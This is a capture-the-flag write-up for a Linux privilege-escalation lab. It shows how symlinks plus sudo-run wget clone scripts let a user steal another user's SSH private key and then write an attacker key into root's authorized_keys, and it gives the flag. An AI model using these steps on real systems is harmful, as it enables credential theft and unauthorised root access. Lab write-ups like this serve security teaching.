# Starlink

### Category

System

### Description

Here is your chance to take a look at one of starlinks internal systems. This server hosts the tool used by Elon Musks engineers to clone various websites. We've heard both the v1 and the v2 are flawed. Can you find and exploit the problems ?

The base credentials are:
```
user1:password123
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

**Part 1**

When loggin in, we notice the script [clone1.py](clone1.py).

`sudo -l` reveals that we can run the script as user2.
```bash
$ sudo -l
Matching Defaults entries for user1 on c7e3b2581fd9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on c7e3b2581fd9:
    (user2) NOPASSWD: /home/user1/clone1.py
```

The script makes a call to wget with some parameters and the user provided URL.
It clones a website, zips it, and moves it to the folder `/home/zip`.

```python
p1 = subprocess.Popen(['wget', '-nc', '-r', '-l', 'inf', '--no-remove-listing', '-q', '-P', '/tmp', url])
```
Let's check the used options.
```
-nc: The no clobber option prevents the download of a file if it already exists.
-r: The recursive option causes wget to download the contents of a directory.
-l: The level option causes wget to download the contents of a directory up to the specified level. (infinit in our case)
--no-remove-listing: The no-remove-listing option prevents wget from removing the directory listing for a directory that is being downloaded.
-q: The quiet option prevents wget from printing progress information to the terminal.
-P: The output directory option specifies the directory where the downloaded files are stored. The directory is /tmp in our case.
```

The challenges name is a hint in itself. We have to exploit symlinks.

The no-clobber option prevents us to exploit symlinks to overwrite files.

But the fact that we are zipping the folder as user2, allows us to exploit symlinks to read any file that user2 has access to.

The machines are not connected to the internet, so there is no point in trying to clone an online website. But we can run a local http server (using python for example) and clone it.

```
python3 -m http.server 80
```

We don't have a choice to run it on port 80, since we are only allowed to use letters and `.` in the hostname.

The hostname will be localhost. Let's setup the exploit.

```
$ mkdir /tmp/localhost
$ ln -s /home/user2/.ssh/id_rsa /tmp/localhost/id_rsa
$ sudo -u user2 ./clone1.py http://localhost
```

Since the zipping is done by user2, it will resolve the symlink to the real file. We can recover the private ssh key in `/home/zip/localhost.zip`.

**Part 2**

Let's connect as user2.
```
$ chmod 600 id_rsa
$ ssh -i id_rsa user2@localhost
```

The [clone2.py](clone2.py) is similar to the firt one, but there is no zipping, and no no-clobbering option.
```python
p1 = subprocess.Popen(['wget', '-r', '-l', 'inf', '--no-remove-listing', '-P', DIR, url])
```

We can run it as root.
```bash
$ sudo -l
Matching Defaults entries for user2 on c7e3b2581fd9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user2 may run the following commands on c7e3b2581fd9:
    (root) NOPASSWD: /home/user2/clone2.py
```

Because of the lack of zipping action, we won't be able to read a file. But we will be able to write any file because we can overwrite files (abscence of no-clobber option), by overwriting a symlink's destination.

Here is how to escalate to root:

```
$ mkdir /home/zip/localhost
$ ln -s /root/.ssh/authorized_keys /home/zip/localhost/my_key
$ mkdir site
$ cat ~/.ssh/id_rsa.pub > site/my_key
$ python3 -m http.server 80 &
$ sudo ./clone2.py http://localhost
$ ssh root@localhost
```

- We create like before the folder where the site will be cloned, and the symlink to the authorized_keys file.

- We create an empty folder that will host the "site".

- We put our public key inside the `my_key` file, which will be cloned to the `/home/zip/localhost` folder, and will overwrite the file pointed by the symlink wearing the same name.

- We run the local http server, and run the cloning process.

After all of these manipulations, we can just ssh as root.

### Flag

```
Hero{SymL1nk5_4r3_tr1cky}
```
